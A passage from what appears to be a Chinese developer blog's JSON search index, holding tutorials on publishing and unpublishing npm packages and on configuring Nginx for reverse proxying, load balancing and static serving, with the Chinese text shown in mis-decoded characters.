\u0026#34;v4.6.0\u0026#34;, \u0026#34;webpack-cli\u0026#34;: \u0026#34;^2.0.14\u0026#34;, \u0026#34;node\u0026#34;: \u0026#34;v8.11.1\u0026#34;, \u0026#34;npm\u0026#34;: \u0026#34;v5.6.0\u0026#34; }, \u0026#34;keywords\u0026#34;: [ \u0026#34;React\u0026#34;, ... ], \u0026#34;author\u0026#34;: \u0026#34;https://github.com/lianpf\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, \u0026#34;devDependencies\u0026#34;: { \u0026#34;uglifyjs-webpack-plugin\u0026#34;: \u0026#34;^1.2.5\u0026#34;, \u0026#34;webpack\u0026#34;: \u0026#34;^4.6.0\u0026#34;, ... }, \u0026#34;dependencies\u0026#34;: { \u0026#34;react\u0026#34;: \u0026#34;^16.3.2\u0026#34;, \u0026#34;redux\u0026#34;: \u0026#34;^4.0.0\u0026#34;, ... } } nameï¼šå¡«å†™ä½ è¿™ä¸ªåŒ…çš„åå­—ï¼Œé»˜è®¤æ˜¯ä½ è¿™ä¸ªæ–‡ä»¶å¤¹çš„åå­—ã€‚ä¸è¿‡è¿™é‡Œè¦ç€é‡è¯´ä¸€ä¸‹ï¼Œæœ€å¥½å…ˆå»npmä¸Šæ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰åŒåçš„åŒ…ã€‚æœ€å¥½çš„æµ‹è¯•æ–¹å¼å°±æ˜¯ï¼Œåœ¨å‘½ä»¤è¡Œé‡Œé¢è¾“å…¥npm install ä½ è¦å–çš„åå­—ï¼Œå¦‚æœæŠ¥é”™ï¼Œé‚£ä¹ˆå¾ˆå¥½ï¼Œnpmä¸Šæ²¡æœ‰è·Ÿä½ åŒåçš„åŒ…ï¼Œä½ å¯ä»¥æ”¾å¿ƒå¤§èƒ†åœ°æŠŠåŒ…å‘å¸ƒå‡ºå»ã€‚å¦‚æœæˆåŠŸä¸‹è½½ä¸‹æ¥äº†ã€‚é‚£ä¹ˆå¾ˆä¸å¹¸ï¼Œæ”¹åå­—å§ã€‚ versionï¼šä½ è¿™ä¸ªåŒ…çš„ç‰ˆæœ¬ï¼Œé»˜è®¤æ˜¯1.0.0 descriptionï¼šæè¿°ä½ çš„åŒ…æ˜¯å¹²å˜›ç”¨çš„ mainï¼šå…¥å£æ–‡ä»¶ï¼Œé»˜è®¤æ˜¯Index.jsï¼Œä½ ä¹Ÿå¯ä»¥è‡ªå·±å¡«å†™ä½ è‡ªå·±çš„æ–‡ä»¶å test commandï¼šæµ‹è¯•å‘½ä»¤ï¼Œè¿™ä¸ªç›´æ¥å›è½¦å°±å¥½äº†ï¼Œç›®å‰è¿˜ä¸éœ€è¦ git repositoryï¼šè¿™ä¸ªæ˜¯gitä»“åº“åœ°å€, å¦‚æœæ²¡æœ‰çš„è¯ï¼Œç›´æ¥å›è½¦ç»§ç»­ã€‚ keywordï¼šè¿™ä¸ªæ˜¯ä¸€ä¸ªé‡ç‚¹ï¼Œè¿™ä¸ªå…³ç³»åˆ°æœ‰å¤šå°‘äººä¼šæœåˆ°ä½ çš„npmåŒ…ã€‚å°½é‡ä½¿ç”¨è´´åˆ‡çš„å…³é”®å­—ä½œä¸ºè¿™ä¸ªåŒ…çš„ç´¢å¼• authorï¼šå†™ä½ çš„è´¦å·æˆ–è€…ä½ çš„githubè´¦å·å§ licenseï¼šå¼€æºæ–‡ä»¶, ç›´æ¥å›è½¦ 1.2 éªŒè¯/ç™»å½•npmjsè´¦å· åˆ‡æ¢åˆ°å®˜æ–¹æº æˆ– è¦å‘å¸ƒåˆ°çš„ç§æœ‰æº\nåˆæ¬¡\n$ npm adduser éåˆæ¬¡\n$ npm login 1.3 å‘å¸ƒï¼ˆæ™®é€šåŒ…ã€æµ‹è¯•åŒ…ã€@å¼€å¤´å‘½åå…¬æœ‰åŒ…ï¼‰å’ŒéªŒè¯ 1.3.1 publishä¹‹å‰ ä½ éœ€è¦åœ¨ä½ package.jsonæ–‡ä»¶çš„å…¥å£æ–‡ä»¶(æˆ‘çš„æ˜¯index.js)å¢åŠ ä¸€æ®µä»£ç :\nmodule.exports = require(\u0026#39;./lib\u0026#39;) ä¸è¦é—®æˆ‘ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼Œå› ä¸ºä½ npm installå…¶ä»–åŒ…çš„æ—¶å€™ï¼Œå…¶ä»–åŒ…é‡Œé¢çš„ä¹Ÿæ˜¯è¿™æ ·å†™\nè¿˜æœ‰å¦‚æœä½ è¿™æ¬¡ä»…ä»…æ˜¯æƒ³æµ‹è¯•è¿™ä¸ªæµç¨‹, åŒ…é‡Œæ²¡æœ‰ä»€ä¹ˆå®è´¨æ€§çš„å†…å®¹çš„è¯, é‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶é‡Œå¯ä»¥ç›´æ¥å†™è¿™ä¹ˆä¸€å¥ hello world\nexports.sayHello = function() { return \u0026#39;Hello World\u0026#39;; } 1.3.2 publish é€‰æ‹©ä½ è¦å‘å¸ƒçš„åŒ…æ‰€åœ¨çš„é¡¹ç›®, ä»¥æˆ‘çš„ä¸ºä¾‹(åŒ…åœ¨react-pc-uiä¸‹):\nlianpf$ cd react-pc-ui [react-pc-ui] lianpf$ npm publish 1.3.3 å‘å¸ƒæµ‹è¯•åŒ… æµ‹è¯•åŒ…ä¸­çš„package.jsonä¿®æ”¹ä¸º \u0026quot;version\u0026quot;: \u0026quot;1.0.0-beta.1\u0026quot; æ‰§è¡Œ npm publish --tag=beta 1.3.4 å‘å¸ƒä»¥@å¼€å¤´å‘½åçš„publicå…¬æœ‰åŒ… @Organization ä»£è¡¨æŸä¸ªç»„ç»‡ï¼Œç±»ä¼¼@babelã€@angularç­‰ã€‚æ²¡æœ‰å¯¹åº”æœºæ„çš„å…è®¸ï¼Œæ— æ³•å‘å¸ƒåŒ…ï¼šerror You must sign up for private packagesï¼š@***/***\nè§£å†³åŠæ³•ï¼š ä½œä¸ºå…¬å…±åŒ…å‘å¸ƒ npm publish --access public\n1.3.5 éªŒè¯å®‰è£… $ npm install xxx --save-dev 1.4 å¯èƒ½é‡åˆ°çš„é—®é¢˜ 1.4.1 é•œåƒé—®é¢˜ no_perms Private mode enable, only admin can publish this module æˆ–è€…publishæˆåŠŸ, ä½†æ˜¯npm.jsä¸ªäººä¿¡æ¯å“ªé‡ŒæŸ¥çœ‹ä¸åˆ°åŒ…\né‚£ä¹ˆå¯èƒ½æ˜¯ä½ ç”¨äº†å›½å†…çš„é•œåƒåœ°å€äº†ï¼Œåªéœ€è¦é‡æ–°æŠŠåœ°å€æ³¨å†Œå›npmjså³å¯\n$ npm config // æŸ¥çœ‹æ‰€æœ‰é…ç½®ç›¸å…³çš„å¯ç”¨å‘½ä»¤ $ npm config get registry // æŸ¥çœ‹é•œåƒ $ npm config set registry http://registry.npmjs.org // é‡æ–°æŠŠåœ°å€æ³¨å†Œå›npmjs å‘å¸ƒä¹‹å, å†é‡æ–°è®¾ç½®ä¸ºæ·˜å®é•œåƒæˆ–è€…ä½ ä»¬å…¬å¸è‡ªå·±çš„é•œåƒ\n1.4.2 å‘½åé—®é¢˜ npm ERR! you do not have permission to publish \u0026#34;your module name\u0026#34;. Are you logged in as the correct user? æç¤ºæ²¡æœ‰æƒé™ï¼Œå…¶å®å°±æ˜¯ä½ çš„moduleååœ¨npmä¸Šå·²ç»è¢«å ç”¨å•¦ï¼Œè¿™æ—¶å€™ä½ å°±å»éœ€è¦å»https://www.npmjs.comæœç´¢ä½ çš„æ¨¡å—åç§°ï¼Œå¦‚æœæœç´¢ä¸åˆ°ï¼Œå°±å¯ä»¥ç”¨ï¼Œ å¹¶ä¸”æŠŠpackage.jsoné‡Œçš„nameä¿®æ”¹è¿‡æ¥ï¼Œé‡æ–°npm publishï¼Œçœ‹åˆ°å¦‚ä¸‹ä¿¡æ¯å°±è¡¨ç¤ºå®‰è£…å®Œæˆäº†ï¼Œrc-fullpageå°±æ˜¯æˆ‘çš„æ¨¡å—å\n2. æ’¤å›npmåŒ… å®˜æ–¹å¯æ’¤å›publishæ“ä½œ24hå†…çš„åŒ…ï¼Œç§æœ‰æºè§†è‡ªè¡Œåˆ¤æ–­ã€‚ä½†æ’¤å›æ“ä½œå‡ä¸å¯é€†ï¼Œè¯·è°¨æ…ä¸ºä¹‹ã€‚\næ’¤å›æŒ‡å®šç‰ˆæœ¬æ¨¡å— $ npm unpublish [@å·²å‘å¸ƒçš„å®Œæ•´åŒ…å@ç‰ˆæœ¬å·] --force // ä¾‹ï¼š npm unpublish @zto/xxx@1.0.0 --force åˆ é™¤æ•´ä¸ªæ¨¡å— $ npm unpublish [@å·²å‘å¸ƒçš„å®Œæ•´åŒ…å]--force // ä¾‹ï¼š npm unpublish @zto/xxx --force 3. ç‰ˆæœ¬å·è§„èŒƒ ä¸»è¦è§„åˆ™ç‰ˆæœ¬æ ¼å¼ï¼šä¸»ç‰ˆæœ¬å·.æ¬¡ç‰ˆæœ¬å·.ä¿®è®¢å·ï¼Œç‰ˆæœ¬å·é€’å¢è§„åˆ™å¦‚ä¸‹\nä¸»ç‰ˆæœ¬å·ï¼šå½“ä½ åšäº†ä¸å…¼å®¹çš„ API ä¿®æ”¹ï¼Œ æ¬¡ç‰ˆæœ¬å·ï¼šå½“ä½ åšäº†å‘ä¸‹å…¼å®¹çš„åŠŸèƒ½æ€§æ–°å¢ï¼Œ ä¿®è®¢å·ï¼šå½“ä½ åšäº†å‘ä¸‹å…¼å®¹çš„é—®é¢˜ä¿®æ­£ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\n","permalink":"https://lianpf.github.io/posts/other/npm-package-nrmimagesourcemanage/","summary":"\u003cp\u003enode ä½œä¸ºå½“å‰æœ€å—æ¬¢è¿çš„\u0026quot;jsç‰ˆ\u0026quot;åç«¯å¼€å‘è¯­è¨€ä¹‹ä¸€ï¼Œæ— è®ºæ˜¯ä¸šåŠ¡å¼€å‘ï¼Œè¿˜æ˜¯è‡ªåŠ¨åŒ–æ„å»ºéƒ¨ç½²ï¼Œä½¿ç”¨æ˜¯å¾ˆé¢‘ç¹çš„ã€‚ä½†æ˜¯\u0026hellip;\u003c/p\u003e","title":"Node: npmåŒ…å’Œnrmç®¡ç†é•œåƒæº"},{"content":"å¸¸ç”¨åŸºç¡€å‘½ä»¤å’ŒNginx Demoé…ç½®è¿‡ç¨‹è®°å½•\u0026hellip;\nä¸€ã€Common Commandsï¼ˆå¸¸ç”¨å‘½ä»¤ï¼‰ $ nginx # å¯åŠ¨ $ nginx -s stop # å¿«é€Ÿåœæ­¢ $ nginx -s quit # å¹³ç¨³é€€å‡º $ nginx -s reload # é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶å‘½ä»¤(å½“é…ç½®æ–‡ä»¶ä¿®æ”¹åï¼Œå¯æ‰§è¡Œæ­¤å‘½ä»¤) $ nginx -t # æµ‹è¯•nginx.confé…ç½® brewå®‰è£…nginxï¼Œæ›´å¤šå‘½ä»¤å‚è€ƒ: å·¥å…·: Homebrew | Blogs\n$ brew search nginx # æœç´¢å…·ä½“çš„ç¨‹åºåŒ… $ brew install nginx # å®‰è£…å…·ä½“çš„ç¨‹åºåŒ… $ brew info nginx # æŸ¥çœ‹å…·ä½“ç¨‹åºçš„ä¿¡æ¯ $ brew uninstall nginx # å¸è½½å…·ä½“çš„åº”ç”¨ äºŒã€Nginx Demoåå‘ä»£ç†é…ç½®è¿‡ç¨‹ ç¡¬ä»¶ mac server node 1.å¯åŠ¨ä¸€ä¸ªnode server node server é…ç½®\nç«¯å£å·è®¾ç½®ä¸º 8080\nè¯·æ±‚åœ°å€ http://localhost\n2.å®‰è£…ã€é…ç½®å’Œæµ‹è¯• $ brew install nginx //å®‰è£…nginx $ brew info nginx //æŸ¥çœ‹nginxä¿¡æ¯(å®‰è£…è·¯å¾„) è¾“å‡ºnginx configåœ°å€ä¸º\n$ /usr/local/etc/nginx/nginx.conf # æˆ–/etc/nginx/nginx.conf åœ¨æ–‡ä»¶é‡Œé¢æ·»åŠ \nserver { listen 8080; //ä½ è¦ç›‘å¬çš„ç«¯å£å· server_name [ä½ è¦ç›‘å¬çš„åŸŸå/IP]; location / { proxy_pass http://127.0.0.1:8085; //ä»£ç†çš„ç›®æ ‡åœ°å€ } } confæ–‡ä»¶ä¸­æœ‰ç¤ºä¾‹çš„serverï¼Œå¯ä»¥æ·»åŠ å¤šä¸ªserve\ntest: è®¿é—®http://127.0.0.1:8085å’Œhttp://localhost:8080è¿”å›responseä¸€è‡´\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\n","permalink":"https://lianpf.github.io/posts/backend-develop/nginx-reverseproxy/","summary":"\u003cp\u003eå¸¸ç”¨åŸºç¡€å‘½ä»¤å’Œ\u003ccode\u003eNginx Demo\u003c/code\u003eé…ç½®è¿‡ç¨‹è®°å½•\u0026hellip;\u003c/p\u003e","title":"Nginx: å¸¸ç”¨å‘½ä»¤å’Œåå‘ä»£ç†é…ç½®"},{"content":"node ä½œä¸ºå½“å‰æœ€å—æ¬¢è¿çš„\u0026quot;jsç‰ˆ\u0026quot;åç«¯å¼€å‘è¯­è¨€ä¹‹ä¸€ï¼Œæ— è®ºæ˜¯ä¸šåŠ¡å¼€å‘ï¼Œè¿˜æ˜¯è‡ªåŠ¨åŒ–æ„å»ºéƒ¨ç½²ï¼Œä½¿ç”¨æ˜¯å¾ˆé¢‘ç¹çš„ã€‚ä½†æ˜¯\u0026hellip;\nèƒ½åšä»€ä¹ˆ åå‘ä»£ç† è´Ÿè½½å‡è¡¡ HTTPæœåŠ¡å™¨ï¼ˆåŒ…å«åŠ¨é™åˆ†ç¦»ï¼‰ æ­£å‘ä»£ç† åå‘ä»£ç† åå‘ä»£ç†åº”è¯¥æ˜¯Nginxåšçš„æœ€å¤šçš„ä¸€ä»¶äº‹äº†ï¼Œä»€ä¹ˆæ˜¯åå‘ä»£ç†å‘¢ï¼Œä»¥ä¸‹æ˜¯ç™¾åº¦ç™¾ç§‘çš„è¯´æ³•ï¼šåå‘ä»£ç†ï¼ˆReverse Proxyï¼‰æ–¹å¼æ˜¯æŒ‡ä»¥ä»£ç†æœåŠ¡å™¨æ¥æ¥å—internetä¸Šçš„è¿æ¥è¯·æ±‚ï¼Œç„¶åå°†è¯·æ±‚è½¬å‘ç»™å†…éƒ¨ç½‘ç»œä¸Šçš„æœåŠ¡å™¨ï¼Œå¹¶å°†ä»æœåŠ¡å™¨ä¸Šå¾—åˆ°çš„ç»“æœè¿”å›ç»™internetä¸Šè¯·æ±‚è¿æ¥çš„å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶ä»£ç†æœåŠ¡å™¨å¯¹å¤–å°±è¡¨ç°ä¸ºä¸€ä¸ªåå‘ä»£ç†æœåŠ¡å™¨ã€‚ç®€å•æ¥è¯´å°±æ˜¯çœŸå®çš„æœåŠ¡å™¨ä¸èƒ½ç›´æ¥è¢«å¤–éƒ¨ç½‘ç»œè®¿é—®ï¼Œæ‰€ä»¥éœ€è¦ä¸€å°ä»£ç†æœåŠ¡å™¨ï¼Œè€Œä»£ç†æœåŠ¡å™¨èƒ½è¢«å¤–éƒ¨ç½‘ç»œè®¿é—®çš„åŒæ—¶åˆè·ŸçœŸå®æœåŠ¡å™¨åœ¨åŒä¸€ä¸ªç½‘ç»œç¯å¢ƒï¼Œå½“ç„¶ä¹Ÿå¯èƒ½æ˜¯åŒä¸€å°æœåŠ¡å™¨ï¼Œç«¯å£ä¸åŒè€Œå·²ã€‚ ä¸‹é¢è´´ä¸Šä¸€æ®µç®€å•çš„å®ç°åå‘ä»£ç†çš„ä»£ç \nserver { listen 80; server_name localhost; client_max_body_size 1024M; location / { proxy_pass http://localhost:8080; proxy_set_header Host $host:$server_port; } } ä¿å­˜é…ç½®æ–‡ä»¶åå¯åŠ¨Nginxï¼Œè¿™æ ·å½“æˆ‘ä»¬è®¿é—®localhostçš„æ—¶å€™ï¼Œå°±ç›¸å½“äºè®¿é—®localhost:8080äº†\nè´Ÿè½½å‡è¡¡ è´Ÿè½½å‡è¡¡ä¹Ÿæ˜¯Nginxå¸¸ç”¨çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œè´Ÿè½½å‡è¡¡å…¶æ„æ€å°±æ˜¯åˆ†æ‘Šåˆ°å¤šä¸ªæ“ä½œå•å…ƒä¸Šè¿›è¡Œæ‰§è¡Œï¼Œä¾‹å¦‚WebæœåŠ¡å™¨ã€FTPæœåŠ¡å™¨ã€ä¼ä¸šå…³é”®åº”ç”¨æœåŠ¡å™¨å’Œå…¶å®ƒå…³é”®ä»»åŠ¡æœåŠ¡å™¨ç­‰ï¼Œä»è€Œå…±åŒå®Œæˆå·¥ä½œä»»åŠ¡ã€‚ç®€å•è€Œè¨€å°±æ˜¯å½“æœ‰2å°æˆ–ä»¥ä¸ŠæœåŠ¡å™¨æ—¶ï¼Œæ ¹æ®è§„åˆ™éšæœºçš„å°†è¯·æ±‚åˆ†å‘åˆ°æŒ‡å®šçš„æœåŠ¡å™¨ä¸Šå¤„ç†ï¼Œè´Ÿè½½å‡è¡¡é…ç½®ä¸€èˆ¬éƒ½éœ€è¦åŒæ—¶é…ç½®åå‘ä»£ç†ï¼Œé€šè¿‡åå‘ä»£ç†è·³è½¬åˆ°è´Ÿè½½å‡è¡¡ã€‚è€ŒNginxç›®å‰æ”¯æŒè‡ªå¸¦3ç§è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œè¿˜æœ‰2ç§å¸¸ç”¨çš„ç¬¬ä¸‰æ–¹ç­–ç•¥ã€‚\n1ã€RRï¼ˆé»˜è®¤ï¼‰ æ¯ä¸ªè¯·æ±‚æŒ‰æ—¶é—´é¡ºåºé€ä¸€åˆ†é…åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ï¼Œå¦‚æœåç«¯æœåŠ¡å™¨downæ‰ï¼Œèƒ½è‡ªåŠ¨å‰”é™¤\nç®€å•é…ç½®\nupstream test { server localhost:8080; server localhost:8081; } server { listen 81; server_name localhost; client_max_body_size 1024M; location / { proxy_pass http://test; proxy_set_header Host $host:$server_port; } } è´Ÿè½½å‡è¡¡çš„æ ¸å¿ƒä»£ç ä¸º\nupstream test { server localhost:8080; server localhost:8081; } è¿™é‡Œæˆ‘é…ç½®äº†2å°æœåŠ¡å™¨ï¼Œå½“ç„¶å®é™…ä¸Šæ˜¯ä¸€å°ï¼Œåªæ˜¯ç«¯å£ä¸ä¸€æ ·è€Œå·²ï¼Œè€Œ8081çš„æœåŠ¡å™¨æ˜¯ä¸å­˜åœ¨çš„,ä¹Ÿå°±æ˜¯è¯´è®¿é—®ä¸åˆ°ï¼Œä½†æ˜¯æˆ‘ä»¬è®¿é—®http://localhostÂ çš„æ—¶å€™,ä¹Ÿä¸ä¼šæœ‰é—®é¢˜ï¼Œä¼šé»˜è®¤è·³è½¬åˆ°http://localhost:8080Â å…·ä½“æ˜¯å› ä¸ºNginxä¼šè‡ªåŠ¨åˆ¤æ–­æœåŠ¡å™¨çš„çŠ¶æ€ï¼Œå¦‚æœæœåŠ¡å™¨å¤„äºä¸èƒ½è®¿é—®ï¼ˆæœåŠ¡å™¨æŒ‚äº†ï¼‰ï¼Œå°±ä¸ä¼šè·³è½¬åˆ°è¿™å°æœåŠ¡å™¨ï¼Œæ‰€ä»¥ä¹Ÿé¿å…äº†ä¸€å°æœåŠ¡å™¨æŒ‚äº†å½±å“ä½¿ç”¨çš„æƒ…å†µï¼Œç”±äºNginxé»˜è®¤æ˜¯RRç­–ç•¥ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦å…¶ä»–æ›´å¤šçš„è®¾ç½®\n2ã€æƒé‡ æŒ‡å®šè½®è¯¢å‡ ç‡ï¼Œweightå’Œè®¿é—®æ¯”ç‡æˆæ­£æ¯”ï¼Œç”¨äºåç«¯æœåŠ¡å™¨æ€§èƒ½ä¸å‡çš„æƒ…å†µã€‚ ä¾‹å¦‚\nupstream test { server localhost:8080 weight=9; server localhost:8081 weight=1; } é‚£ä¹ˆ10æ¬¡ä¸€èˆ¬åªä¼šæœ‰1æ¬¡ä¼šè®¿é—®åˆ°8081ï¼Œè€Œæœ‰9æ¬¡ä¼šè®¿é—®åˆ°8080\n3ã€ip_hash ä¸Šé¢çš„2ç§æ–¹å¼éƒ½æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯ä¸‹ä¸€ä¸ªè¯·æ±‚æ¥çš„æ—¶å€™è¯·æ±‚å¯èƒ½åˆ†å‘åˆ°å¦å¤–ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå½“æˆ‘ä»¬çš„ç¨‹åºä¸æ˜¯æ— çŠ¶æ€çš„æ—¶å€™ï¼ˆé‡‡ç”¨äº†sessionä¿å­˜æ•°æ®ï¼‰ï¼Œè¿™æ—¶å€™å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„å¾ˆé—®é¢˜äº†ï¼Œæ¯”å¦‚æŠŠç™»å½•ä¿¡æ¯ä¿å­˜åˆ°äº†sessionä¸­ï¼Œé‚£ä¹ˆè·³è½¬åˆ°å¦å¤–ä¸€å°æœåŠ¡å™¨çš„æ—¶å€™å°±éœ€è¦é‡æ–°ç™»å½•äº†ï¼Œæ‰€ä»¥å¾ˆå¤šæ—¶å€™æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå®¢æˆ·åªè®¿é—®ä¸€ä¸ªæœåŠ¡å™¨ï¼Œé‚£ä¹ˆå°±éœ€è¦ç”¨iphashäº†ï¼Œiphashçš„æ¯ä¸ªè¯·æ±‚æŒ‰è®¿é—®ipçš„hashç»“æœåˆ†é…ï¼Œè¿™æ ·æ¯ä¸ªè®¿å®¢å›ºå®šè®¿é—®ä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œå¯ä»¥è§£å†³sessionçš„é—®é¢˜\nupstream test { ip_hash; server localhost:8080; server localhost:8081; } 4ã€fairï¼ˆç¬¬ä¸‰æ–¹ï¼‰ æŒ‰åç«¯æœåŠ¡å™¨çš„å“åº”æ—¶é—´æ¥åˆ†é…è¯·æ±‚ï¼Œå“åº”æ—¶é—´çŸ­çš„ä¼˜å…ˆåˆ†é…\nupstream backend { fair; server localhost:8080; server localhost:8081; } 5ã€url_hashï¼ˆç¬¬ä¸‰æ–¹ï¼‰ æŒ‰è®¿é—®urlçš„hashç»“æœæ¥åˆ†é…è¯·æ±‚ï¼Œä½¿æ¯ä¸ªurlå®šå‘åˆ°åŒä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨ä¸ºç¼“å­˜æ—¶æ¯”è¾ƒæœ‰æ•ˆã€‚ åœ¨upstreamä¸­åŠ å…¥hashè¯­å¥ï¼Œserverè¯­å¥ä¸­ä¸èƒ½å†™å…¥weightç­‰å…¶ä»–çš„å‚æ•°ï¼Œhash_methodæ˜¯ä½¿ç”¨çš„hashç®—æ³•\nupstream backend { hash $request_uri; hash_method crc32; server localhost:8080; server localhost:8081; } ä»¥ä¸Š5ç§è´Ÿè½½å‡è¡¡å„è‡ªé€‚ç”¨ä¸åŒæƒ…å†µä¸‹ä½¿ç”¨ï¼Œæ‰€ä»¥å¯ä»¥æ ¹æ®å®é™…æƒ…å†µé€‰æ‹©ä½¿ç”¨å“ªç§ç­–ç•¥æ¨¡å¼,ä¸è¿‡fairå’Œurl_hashéœ€è¦å®‰è£…ç¬¬ä¸‰æ–¹æ¨¡å—æ‰èƒ½ä½¿ç”¨ï¼Œç”±äºæœ¬æ–‡ä¸»è¦ä»‹ç»Nginxèƒ½åšçš„äº‹æƒ…ï¼Œæ‰€ä»¥Nginxå®‰è£…ç¬¬ä¸‰æ–¹æ¨¡å—ä¸ä¼šå†æœ¬æ–‡ä»‹ç»\nHTTPæœåŠ¡å™¨ Nginxæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªé™æ€èµ„æºçš„æœåŠ¡å™¨ï¼Œå½“åªæœ‰é™æ€èµ„æºçš„æ—¶å€™ï¼Œå°±å¯ä»¥ä½¿ç”¨Nginxæ¥åšæœåŠ¡å™¨ï¼ŒåŒæ—¶ç°åœ¨ä¹Ÿå¾ˆæµè¡ŒåŠ¨é™åˆ†ç¦»ï¼Œå°±å¯ä»¥é€šè¿‡Nginxæ¥å®ç°ï¼Œé¦–å…ˆçœ‹çœ‹Nginxåšé™æ€èµ„æºæœåŠ¡å™¨\nserver { listen 80; server_name localhost; client_max_body_size 1024M; location / { root e:wwwroot; index index.html; } } è¿™æ ·å¦‚æœè®¿é—®http://localhostÂ å°±ä¼šé»˜è®¤è®¿é—®åˆ°Eç›˜wwwrootç›®å½•ä¸‹é¢çš„index.htmlï¼Œå¦‚æœä¸€ä¸ªç½‘ç«™åªæ˜¯é™æ€é¡µé¢çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ¥å®ç°éƒ¨ç½²\nåŠ¨é™åˆ†ç¦» åŠ¨é™åˆ†ç¦»æ˜¯è®©åŠ¨æ€ç½‘ç«™é‡Œçš„åŠ¨æ€ç½‘é¡µæ ¹æ®ä¸€å®šè§„åˆ™æŠŠä¸å˜çš„èµ„æºå’Œç»å¸¸å˜çš„èµ„æºåŒºåˆ†å¼€æ¥ï¼ŒåŠ¨é™èµ„æºåšå¥½äº†æ‹†åˆ†ä»¥åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®é™æ€èµ„æºçš„ç‰¹ç‚¹å°†å…¶åšç¼“å­˜æ“ä½œï¼Œè¿™å°±æ˜¯ç½‘ç«™é™æ€åŒ–å¤„ç†çš„æ ¸å¿ƒæ€è·¯\nupstream test{ server localhost:8080; server localhost:8081; } server { listen 80; server_name localhost; location / { root e:wwwroot; index index.html; } # æ‰€æœ‰é™æ€è¯·æ±‚éƒ½ç”±nginxå¤„ç†ï¼Œå­˜æ”¾ç›®å½•ä¸ºhtml location ~ .(gif|jpg|jpeg|png|bmp|swf|css|js)$ { root e:wwwroot; } # æ‰€æœ‰åŠ¨æ€è¯·æ±‚éƒ½è½¬å‘ç»™tomcatå¤„ç† location ~ .(jsp|do)$ { proxy_pass http://test; } error_page 500 502 503 504 /50x.html; location = /50x.html { root e:wwwroot; } } è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å§HTMLä»¥åŠå›¾ç‰‡å’Œcssä»¥åŠjsæ”¾åˆ°wwwrootç›®å½•ä¸‹ï¼Œè€Œtomcatåªè´Ÿè´£å¤„ç†jspå’Œè¯·æ±‚ï¼Œä¾‹å¦‚å½“æˆ‘ä»¬åç¼€ä¸ºgifçš„æ—¶å€™ï¼ŒNginxé»˜è®¤ä¼šä»wwwrootè·å–åˆ°å½“å‰è¯·æ±‚çš„åŠ¨æ€å›¾æ–‡ä»¶è¿”å›ï¼Œå½“ç„¶è¿™é‡Œçš„é™æ€æ–‡ä»¶è·ŸNginxæ˜¯åŒä¸€å°æœåŠ¡å™¨ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨å¦å¤–ä¸€å°æœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡åå‘ä»£ç†å’Œè´Ÿè½½å‡è¡¡é…ç½®è¿‡å»å°±å¥½äº†ï¼Œåªè¦ææ¸…æ¥šäº†æœ€åŸºæœ¬çš„æµç¨‹ï¼Œå¾ˆå¤šé…ç½®å°±å¾ˆç®€å•äº†ï¼Œå¦å¤–localtionåé¢å…¶å®æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ‰€ä»¥éå¸¸çµæ´»\næ­£å‘ä»£ç† æ­£å‘ä»£ç†ï¼Œæ„æ€æ˜¯ä¸€ä¸ªä½äºå®¢æˆ·ç«¯å’ŒåŸå§‹æœåŠ¡å™¨(origin server)ä¹‹é—´çš„æœåŠ¡å™¨ï¼Œä¸ºäº†ä»åŸå§‹æœåŠ¡å™¨å–å¾—å†…å®¹ï¼Œå®¢æˆ·ç«¯å‘ä»£ç†å‘é€ä¸€ä¸ªè¯·æ±‚å¹¶æŒ‡å®šç›®æ ‡(åŸå§‹æœåŠ¡å™¨)ï¼Œç„¶åä»£ç†å‘åŸå§‹æœåŠ¡å™¨è½¬äº¤è¯·æ±‚å¹¶å°†è·å¾—çš„å†…å®¹è¿”å›ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯æ‰èƒ½ä½¿ç”¨æ­£å‘ä»£ç†ã€‚å½“ä½ éœ€è¦æŠŠä½ 